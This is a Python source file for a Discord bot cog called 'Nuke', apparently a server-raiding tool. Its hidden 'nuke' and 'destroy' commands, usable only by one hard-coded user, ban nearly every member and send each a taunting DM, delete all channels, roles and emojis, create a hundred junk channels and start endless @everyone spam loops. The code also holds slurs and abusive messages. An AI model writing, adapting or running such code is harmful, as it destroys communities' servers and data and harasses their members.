import discord
from discord.ext import commands
from discord.utils import get as discget

class Nuke(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.message = "you got fucked up\n https://cdn.discordapp.com/attachments/603298907023343723/609265114331217933/Soldiers_raising_the_Albanian_flag_over_the_Reichstag_Berlin_1945_2.jpg"
        self.invites = '@everyone'
        self.koda = 599507281226367006
        self.no_ban = [599507281226367006, 490275541413265409]
        self.servers = [599514553201459201, 617165058446721091, 622217454994849800]
    
    async def delete_channels(self, ctx):
        print("Deleted channels ( ", end='', flush=True)
        for channel in ctx.guild.channels:
            try:
                await channel.delete()
                print(f"'{channel.name}', ", end='', flush=True)
            except:
                pass
        print(')\n')
    
    async def delete_roles(self, ctx):
        print("Deleted roles ( ", end='', flush=True)
        for role in ctx.guild.roles:
            try:
                await role.delete()
                print(f"'{role.name}', ", end='', flush=True)
            except:
                pass
        print(')\n')

    async def delete_emojis(self, ctx):
        print("Deleted emojis ( ", end='', flush=True)
        for emoji in ctx.guild.emojis:
            try:
                await emoji.delete()
                print(f"'{emoji.name}', ", end='', flush=True)
            except:
                pass
        print(')\n')
    
    async def ban_members(self, ctx):
        print("Banned members ( ", end='', flush=True)
        for member in ctx.guild.members:
            try:
                if not member.id in self.no_ban:
                    await ctx.guild.ban(member, reason="NUKE")
                    print(f"'{member.name}', ", end='', flush=True)
                    await member.send(f"{self.message}\n{self.invites}")
            except:
                pass
        print(')\n')
    
    async def make_channels(self, ctx):
        for i in range(100):
            try:
                await ctx.guild.create_text_channel(f"berlin-{i}")
            except:
                print(f"Created ( {i} channels )")
    
    async def spam_channel(self, ctx):
        while True:
            try:
                await ctx.send(f"{self.message}\n{self.invites}\n@everyone")
            except:
                pass
    
    async def spam_all_channels(self, ctx):
        for channel in ctx.guild.channels:
            await channel.send(">spam")

    @commands.Cog.listener()
    async def on_message(self, ctx):
        if ctx.author.bot:
            if ctx.content.startswith(">spam"):
                await self.spam_channel(ctx.channel)
    
    @commands.command(hidden=True)
    async def nuke(self, ctx):
        # await ctx.message.delete()
        if ctx.author.id == self.koda:
            if not ctx.guild.id in self.servers:
                await self.ban_members(ctx)
                await self.delete_channels(ctx)
                await self.delete_roles(ctx)
                await self.delete_emojis(ctx)
                await self.make_channels(ctx)
                await self.spam_all_channels(ctx)
                print("Done!")
            else:
                await ctx.send("Koda you fucking retard you can't nuke this server.")
        else:
            koda = self.bot.get_user(self.koda)
            await koda.send(f"{ctx.author} attempted to use the nuke command in {ctx.guild.name}.")
            await ctx.send("You have been reported to Koda for attempting to use the nuke command.")
    
    @commands.command(hidden=True)
    async def destroy(self, ctx):
        await ctx.message.delete()
        if ctx.author.id == self.koda:
            if not ctx.guild.id in self.servers:
                await self.delete_channels(ctx)
                await self.delete_roles(ctx)
                await self.delete_emojis(ctx)
                print("Done!")
            else:
                await ctx.send("Koda you fucking retard you can't nuke this server.")
        else:
            koda = self.bot.get_user(self.koda)
            await koda.send(f"{ctx.author} attempted to use the nuke command in {ctx.guild.name}.")
            await ctx.send("You have been reported to Koda for attempting to use the nuke command.")

def setup(bot):
    bot.add_cog(Nuke(bot))